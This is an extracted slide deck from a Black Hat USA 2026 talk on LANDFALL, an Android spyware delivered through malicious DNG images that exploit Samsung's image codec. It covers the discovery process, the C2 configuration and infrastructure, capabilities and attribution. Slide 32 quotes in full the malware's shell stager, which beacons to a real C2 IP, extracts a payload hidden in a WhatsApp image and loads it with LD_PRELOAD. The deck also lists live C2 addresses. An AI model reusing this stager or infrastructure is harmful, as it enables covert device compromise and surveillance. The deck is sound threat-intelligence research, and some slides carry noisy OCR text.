---
title: "Hunting LANDFALL From Overlooked Images to State-Linked Mobile Spyware"
speakers: ["Itay Cohen (Megabeets)"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/Itay Cohen (Megabeets)_Hunting LANDFALL From Overlooked Images to State-Linked Mobile Spyware.pdf"
pages: 54
sha256: "bec38d4f3a8163608f57693fcda6e3990cdf0c5d26dac962c3c55ff38cb67168"
text_chars: 19052
ocr_pages: 17
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T23:10:29Z"
---
# Hunting LANDFALL From Overlooked Images to State-Linked Mobile Spyware

**Speakers:** Itay Cohen (Megabeets)  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/Itay Cohen (Megabeets)_Hunting LANDFALL From Overlooked Images to State-Linked Mobile Spyware.pdf` (54 pages)

## Slide 1

# LANDFALL*

from overlooked images to state-linked mobile **spyware** .

Black Hat USA 2026

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
|
i
om overlooked images
state-linked
“mobile spyware.
ALLE LAL EEUORE AOE DEA IO
Coie ‘Hat “USA 2026
Rig 8
```

## Slide 2

FINDING WHAT WE DIDN’T SEARCH FOR*

## Slide 3

I am a **Senior Principal Researcher** at the research and analysis division of **Palo Alto Networks** . As part of my work in the threat intel teams of **Unit 42** , I work across malware analysis, threat intel, **reverse engineering** . I try to turn complex technical findings into clear stories, useful tools, and public research that helps defenders. I am an **Animal Liberation Activist** and care deeply about animal liberation. I also maintain open-source reverse engineering projects such as Rizin and Cutter, and was selected for **Forbes 30 under 30** for my threat research and activism.

ITAY COHEN

## Slide 4

###### Hunting from almost nothing

Turning evasion into signal

## Slide 5

AUGUST 2025

## Slide 6

**Apple Patches CVE-2025-43300** **Zero-Day in iOS, iPadOS, and macOS Exploited in Targeted Attacks**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The Hacker News
Apple Patches CVE-2025-43300 Zero-Day in iOS,
iPadOS, and macOS Exploited in Targeted Attacks
WhatsApp Zero-Day Exploited in
Attacks Targeting Apple Users
The vulnerability (CVE-2025-55177) was exploited along an iOS/macOS
zero-day in suspected spyware attacks.
wifi (itt
```

## Slide 7

**Apple Patches CVE-2025-43300** **Zero-Day in iOS, iPadOS, and macOS Exploited in Targeted Attacks No IoCs, no public samples**

## Slide 8

**CVE-2025-43300** is a critical memory corruption vulnerability in Apple's image processing framework that affects iOS and macOS systems. The vulnerability exists in the decompression code within RawCamera.bundle, triggered by inconsistencies between TIFF metadata and JPEG stream parameters in **DNG files** .

## Slide 9

**D** IGITAL **N** E **G** ATIVE

TIFF-based image file format

## Slide 10

## **D** IGITAL

**N** E **G** ATIVE **OPCODES**

**3 Opcode Lists**

**Designed for things like lens correction Turing Complete**

## Slide 11

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Matches - 6/~6 Files ©
9297888746158e38d320b05b27b0032b2cc29231be8990d87bc46 f1e06456F93
© WhatsApp Image 2025-02-10 at 4.54.17 PM.jpeg
b975b499baa3119ac5c2b3379306d4e50b9610e9bba3e56de7d fd3927a96032d
© 390a4964-68ad-4bdd-9f63-4a8ec371596a. jpeg
c0f30c2a2d6f95b57128e78dc0b7180e69315057e62809de1926b75f86516b2e
coy WhatsApp Image 2024-08-27 at 11.48.40 AM.jpeg
b06dec10e8ad0005ebb9da24204c96cb2e297bd8d418bc1c8983d066c0997756
coy IMG-20250120-WAQ00S. jpg
b45817f fb0355badcc89f2d7d48eec f O0ebd f2b966ac986514F9d971F6c57d18
coy IMG-20240723-WAQ000. jpg
29882a3c426273a7302e852aa7 7662e168b6d44dcebfca53757e29a9cd f02483
coy IMG-20240723-WAQ001. jpg
First seen
2025-02-10
13:56:53
2024-08-27
21:26:55
2024-08-27
09:39:53
2025-01-20
14:37:04
2024-07-23
10:08:54
2024-07-23
10:05:57
```

## Slide 12

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Matches - 6/~6 Files ©
9297888746158e38d320b05b27b0032b2cc29231be8990d87bc46f1e06456F93
@ © © WhatsApp Image 2025-02-10 at 4.54.17 PM.jpeg
“ti
§975b499baa3119ac5c2b3379306d4e50b9610e9bba3e56de7d fd3927a96032d
@ — © 390a4964-68ad-4bdd-9f63-4a8ec371596a. jpeg
“ti
©0f30c2a2d6f95b57128e78dc0b7180e69315057e62809de1926b75f86516b2e
@ © © WhatsApp Image 2024-08-27 at 11.48.40 AM. jpeg
“tiff
bO6dec10e8ad0005ebb9da24204c96cb2e297bd8d418bc1c8983d066c0997756
© © © IMG-20250120-wA0005. jpg
tiff
b45817f fb0355badcc89f2d7d48eec fO0ebd f2b966ac986514F9d971F6C57d18
@ © © IMG-20240723-wA0000. jpg
ti
298824a3C426273a/302e852aa7 /662e168b6d44dcebfca53757e29a9cd f02483
@ © © IMG-20240723-wA0001. jpg
“ti
First seen
2025-02-10
3:00.53)
2024-08-27
21:26:55
2024-08.
09:39:53
2025-01-20
14:37:04
2024-07-23
10:08:54
2024-07-23
10:05:57
```

## Slide 13

|Iran
**Uploaded from**|
|---|
|Iraq|
|Turkey|
|Morocco
. . .
.|

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Uploaded from
Za
38d320b05b27b0032b2cc29231be8990d87bc46f1e06456f93
Image 2025-02-10 at 4.54.17 PM.jpeg
9ac5c2b3379306d4e50b9610e9bba3e56de7d fd3927a96032d
68ad-4bdd-9F63-4a8ec371596a. jpeg
157128e78dc0b7180e69315057e62809de1926b75f86516b2e
Image 2024-08-27 at 11.48.40 AM. jpeg
)5ebb9da24204c96cb2e297bd8d418bc1c8983d066c0997756
120-WAO00S. jpg
idcc89f2d7d48eecfO0ebd f2b966ac986514F9d971F6c57d18
0723-WAQ000. jpg
17302€852aa7 7662e168b6d44dcebfca53757e29a9cdf02483
'23-WA0001.jpg
First seen
2025-02-10
3;00:53)
2024-08-27
21:26:55
2024-08-27
09:39:53
2025-01-20
14:37:04
2024-07-23
10:08:54
2024-07-23
10:05:57
```

## Slide 14

WhatsApp

WhatsApp

WA

WA

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Matches - 6/~6 Files @
9297888746158e38d320b05b27b0032b2cc29231be8990d87H
© WhatsApp Image 2025-02-10 at 4.54.17 PM.jpeg
c0f30c2a2d6f95b57128e78dc0b7180e69315057e62809delg
© WhatsApp Image 2024-08-27 at 11.48.40 AM.jpeg
b06dec10e8ad0005ebb9da24204c96cb2e297bd8d418bc1ic8q
© IMG-20250120-WA0005. jpg
b45817f fb0355badcc89f2d7d48eec fO0ebd f2b966ac986514
© IMG-20240723-WA0000. jpg
```

## Slide 15

###### Legitimate TIFF header

Timestamp

## Slide 16

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
00547FDO0:
00547FE0:
00547FFO:
00548000:
00548010:
00548020:
00548030:
00548040:
00548050:
00548060:
00548070:
00 FB
00 00
00 84
74 61
70 73
00 OD
41 02
EF FE
22 A2
F9 64
AO AB
00
00
33
2F
65
40
00
5D
D8
EO
6F
43
08
05
63
72
F2
21
00
GA
3D
E6
lene yp
sooo000C CAFEBABE
a AJ.X.N
mips Dero Oost da
ta/data/com.sams
ung.ipservice/fi
les/1L..@...7ZXZ.
Sueee A..!.....t/
```

## Slide 17

data/data/com. **samsung** .ipservice/files/ **l** data/data/com. **samsung** .ipservice/files/ **b.so**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
005A7210:
005A7220:
005A7230:
005A7240:
005A7250:
005A7260:
005A7270:
005A7280:
005A7290:
O05A72A0:
O05A72B0:
Lee eee data/da
ta/com.samsung.i
pservice/files/l
Se 24..da
ta/data/com.sams
ung.ipservice/fi
les/b.soPK......
data/data/com.samsung.ipservice/files/1
data/data/com.samsung.ipservice/files/b.so
```

## Slide 18

wait - Samsung?

## Slide 19

! Yes, Samsung

$ **file** b.so .l

**b.so** : ELF 64-bit LSB shared object, **ARM aarch64 l** : **XZ** compressed data (ELF 64-bit, too)

## Slide 20

EXPECTATIONS…

REALITY…. Hello,
Android!

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
EXPECTATIONS...
REALITY..... Hello, a ~
Android!
```

## Slide 21

###### **THE FLOW**

**com.samsung.ipservice** powers intelligent features like AI tagging by **periodically scanning Android's MediaStore** .

**WhatsApp** **downloads** media there.

## Slide 22

###### **THE FLOW**

**com.samsung.ipservice** powers intelligent features like AI tagging by **periodically scanning Android's MediaStore** .

**WhatsApp** **downloads** media there.

###### **01 / RECEIVE**

###### **02 / INDEX**

###### **03 / EXPOSE**

**WhatsApp App** WhatsApp receives and downloads an image file, saving it to the device storage.

**Android OS** The downloaded image is inserted into Android's system-wide MediaStore.

**samsung.ipservice** The background service scans the MediaStore, parses the image and expose the system to attack.

## Slide 23

libimagecodec. quram. so

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
libimagecodec . @Uuiget.so
ty,
```

## Slide 24

Code which processes **untrustworthy inputs** DO NOT! Code Code written which in an runs with **unsafe no language sandbox** GOOGLE’s RULE OF 2

## Slide 25

CVE-2025 -21042

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
> ifr
ray
IK NSS
Yi
Beall
RON
|
```

## Slide 26

##### TIMELINE

First malicious DNG image file appears on VirusTotal

July, 2024

## Slide 27

##### TIMELINE

First malicious DNG image file appears on VirusTotal

Sept 25, 2024

Vulnerability that July, 2024 would become **CVE-2025-21042** was privately reported to Samsung

## Slide 28

##### TIMELINE

First malicious DNG image file appears on VirusTotal

Sept 25, 2024

Samsung issues firmware update to address vulnerability that would become CVE-2025-21042

Vulnerability that July, 2024 would become **CVE-2025-21042** was privately reported to Samsung

April, 2025

## Slide 29

##### TIMELINE

First malicious DNG image file appears on VirusTotal Sept 25, 2024 Vulnerability that July, 2024 would become **CVE-2025-21042** was privately reported to Samsung

Samsung issues firmware update to address vulnerability that would become CVE-2025-21042 August, 2025 ● Apple patches DNG vulnerability April, 2025 ● WhatsApp discloses chained exploit ● WhatsApp notifies Samsung of another vuln — **CVE-2025-21043**

## Slide 30

##### TIMELINE

First malicious DNG image file appears on VirusTotal

Sept 25, 2024

Samsung issues firmware update to address vulnerability that would become CVE-2025-21042

August, 2025

Samsung issues firmware update to address CVE-2025-21043 and discloses CVE-2025-21042

Vulnerability that July, 2024 would become **CVE-2025-21042** was privately reported to Samsung

- Apple patches DNG vulnerability

- April, 2025 Sept, 2025 ● WhatsApp discloses chained exploit

- ● WhatsApp notifies Samsung of another vuln — **CVE-2025-21043**

## Slide 31

**projectzero.google** /2025/12/android-itw-dng.html

## Slide 32

**/system/bin/sh -c 'ping -c 1 -w1 -p 2066c1d8ce2834f1fbb1296f9dca73419 91.132.92.35 >/dev/null & '; pid=`cat /proc/self/stat | cut -F 4` && ppid=`cat /proc/$pid/stat | cut -F 4`; rm -f /data/data/com.samsung.ipservice/files/b.so;**

**rm -f /data/data/com.samsung.ipservice/files/z.zip; image=`find /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/ /storage/emulated/95/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/**

**/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1000/Media/WhatsApp Images/ [...]**

**/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1010/Media/WhatsApp Images/ -type f -atime -720m -maxdepth 1 -exec grep -lo '.*066c1d8ce2834f1fbb1296f9dca73419.*' {} \; -quit 2>/dev/null` ; /system/bin/sh -c 'ping -c 1 -w1 -p $(test "$image" && echo 31066c1d8ce2834f1fbb1296f9dca73419 || echo 30066c1d8ce2834f1fbb1296f9dca73419) 91.132.92.35 >/dev/null & ' ;**

**tail -c $(( 390245 )) "$image" > /data/data/com.samsung.ipservice/files/z.zip && unzip -o -d / /data/data/com.samsung.ipservice/files/z.zip && chmod +x /data/data/com.samsung.ipservice/files/b.so; R=I SEP=CAFEBABE LD_PRELOAD=/data/data/com.samsung.ipservice/files/b.so /system/bin/id; content write --uri "content://com.samsung.cmh/files?service_flag=update%20files SET serviceflag= serviceflag | 66304";**

**kill -9 $ppid**

## Slide 33

**/system/bin/sh -c 'ping -c 1 91.132.92.35 >/dev/null & '**

[...]

**rm -f** /data/data/com.samsung.ipservice/files/ **b.so**

**rm -f** /data/data/com.samsung.ipservice/files/ **z.zip** [...]

**find** /storage/emulated/0/Android/media / **com.whatsapp** / **WhatsApp/Media/WhatsApp Images** / [...]

**unzip -o -d** / /data/data/com.samsung.ipservice/files/ **z.zip chmod** +x /data/data/com.samsung.ipservice/files/ **b.so R** =I **SEP** = **CAFEBABE LD_PRELOAD** =/data/data/com.samsung.ipservice/files/ **b.so** /system/bin/id

## Slide 34

INSIDE LANDFALL*

## Slide 35

data/data/com. **samsung** .ipservice/files/ **l** data/data/com. **samsung** .ipservice/files/ **b.so**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
005A7210:
005A7220:
005A7230:
005A7240:
005A7250:
005A7260:
005A7270:
005A7280:
005A7290:
O05A72A0:
O05A72B0:
2
Lee eee data/da
ta/com.samsung.i
pservice/files/l
Se 24..da
ta/data/com.sams
ung.ipservice/fi
les/b.soPK......
data/data/com.samsung.ipservice/files/1
data/data/com.samsung.ipservice/files/b.so
```

## Slide 36

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
00013920:
0001392F:
0001393E:
0001394D:
0001395C:
0001396B:
0001397A:
00013989:
00013998:
000139A7:
159B6:
73
00
69
79
oF
65 6E
73 69
00 70
79 6C
63 6F
67 65
SF 6D
65 61
6F 72
69 6E
6C 64
63
73
65
6F
6D
SF
69
64
00
63
3D
.persistency_ba
ckup.persistenc
y_origin.persis
tency_payLload.a
gent_id.command
_id.bridge_head
_version_minor.
bridge_head_ver
sion_major.publ
ic_key.&increme
ntal_build=.&eu
=
```

## Slide 37

**BRIDGE HEAD**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
00013920:
00013592F:
0001393E:
0001394D:
0001395C:
0001396B:
0001397A:
00013989:
00013998:
000139A7:
000139B6:
63
79
62
73
69
6E
persistency_ba
ckup.persistenc
y_origin.persis
tency_paylLload.a
gent_id.command
_id.bridge_head
_version_minor
bridge_head_ver
Sion_major.publ
ic_key.&increme
ntal_build=.&eu
=
```

## Slide 38

{

### CONFIGURATION

"cnc_hostname":  " **91.132.92.35** ",

"cnc_port":  22398,

"cnc_base_url":  "is/",

"agent_id":  "066c1d8c-e283-4f1f-bb12-96f9dca73419",

"command_id":  "4317c7e3-2898-4886-aa9c-935c0ac328fa",

"sleep_time":  1,

- "sepolicy_zipped_device_path":  "/data/data/com. **samsung** .ipservice/files/ **l** ", "sepolicy_device_path":  "/data/data/com. **samsung** .ipservice/files/ **l.so** ",

- "sepolicy_magic":  " **CAFEBABE** "

}

## Slide 39

### CAPABILITIES*

microphone recording location tracking browser database extraction

microphone recording calls recording & camera access interception location tracking SMS & contacts whatsapp images browser database applications images exfiltration extraction arbitrary file anti analysis read & write

## Slide 40

###### **C2 Addresses Extracted from LANDFALL Configs**

|C2 IP|Port|Agent ID|Cert|Valid|
|---|---|---|---|---|
|45.155.250[.]158|22387|176eb95f-5683-4228-8869-141a227b5aad|2024-04|→2025-04|
|92.243.65[.]240|22387|e47a0f01-54b4-407f-8263-8078748cf913|2024-07|→2025-07|
|46.246.28[.]75|22387|b8e5fa71-289d-408a-b2ad-60c4b090d653|2024-12|→2025-12|
|91.132.92[.]35|22398|066c1d8c-e283-4f1f-bb12-96f9dca73419|2025-01|→2026-01|

## Slide 41

###### **C2 Addresses Extracted from LANDFALL Configs**

C2 IP Port Agent ID Cert Valid
45.155.250[.]158 22387 176eb95f-5683-4228-8869-141a227b5aad 2024-04 → 2025-04
92.243.65[.]240 22387 Cluster e47a0f01-54b4-407f-8263-8078748cf913 A 2024-07 → 2025-07
46.246.28[.]75 22387 b8e5fa71-289d-408a-b2ad-60c4b090d653 2024-12 → 2025-12
91.132.92[.]35 22398 066c1d8c-e283-4f1f-bb12-96f9dca73419 2025-01 → 2026-01

## Slide 42

###### **Two Infrastructure Clusters**

||**Cluster A**|
|---|---|
|PORTS|22387, 22397, 22398, 5323, ~10900,
~24000|
|SERVER|Nginx (various versions)|
|TLS|Self-signed OpenSSL defaults|
|RESPONSE|404 / 405 / 500 as control signals|

## Slide 43

###### **Two Infrastructure Clusters**

**Cluster A** PORTS 22387, 22397, 22398, 5323, ~10900, ~24000 SERVER Nginx (various versions) TLS Self-signed OpenSSL defaults RESPONSE 404 / 405 / 500 as control signals

Those domains resolve to different servers — a **second layer** of infrastructure.

## Slide 44

###### **Two Infrastructure Clusters**

||**Cluster A**||**Cluster B**|
|---|---|---|---|
|PORTS
SERVER
TLS|22387, 22397, 22398, 5323, ~10900,
~24000
Nginx (various versions)
Self-signed OpenSSL defaults|PORTS
SERVER
TLS|443 (standard HTTPS)
Nginx 1.18.0 (Ubuntu)
Let's Encrypt certificates|
|RESPONSE|404 / 405 / 500 as control signals|COVER|WordPress sites w/ generic content|
|||REGISTRAR|Namecheap (all domains)|
|||NAMING|Multi-word English (2-3 words)|

## Slide 45

We observed **Windows** malware beaconing to **Cluster B** infrastructure for C2

communications

## Slide 46

ATTRIBUTION*

## Slide 47

**Stealth Falcon** TGR-UNK-1069

Targets governments, f i nancial institutions, and telecom organizations across the Middle East and North Africa.

## Slide 48

### Differential Analysis

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
STAN WL
Differential Me
Analysis — SHAR
pes) LEA |
```

## Slide 49

#### The Problem

###### **The Fingerprint**

Server nginx/1.18.0 (Ubuntu) Port 443 Certificate Let's Encrypt Content WordPress

How many servers on the internet match this description?

~ **2,000,000** Among the most common web server configuration on the internet. **Fingerprinting alone is useless** .

## Slide 50

##### The Discovery

||Scanner A|Scanner B|Scanner C|
|---|---|---|---|
|Known C2 #1|✗|✗|✓|
|Known C2 #2|✗|✗|✓|
|Known C2 #3|✗|✗|✓|
|...|✗|✗|✓|
|All 12 confirmed C2s|0/12|0/12|12/12|
|Legitimate Nginx servers|✓|✓|✓|

## Slide 51

#### Differential Scanner Analysis

The actor blocked Scanner A’s and B ‘s IP ranges on their C2 servers.
They missed Scanner C . That gap is the signal.
Step 1 Step 2 Step 3 Step 4 Step 5
Query Scanner C Query Scanner A Subtract Refine Validate

## Slide 52

If you have known C2 servers and they're absent from a scanner, that's **not** missing data. **That's signal** .

## Slide 53

hunting from nothing turning attacker’s opsec against them don’t just stick to one tool

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
% hunting from nothing
X& turning attacker’s opsec
A against them
X don’t just stick to one tool
```

## Slide 54

**@** megabeets_

THANK YOU
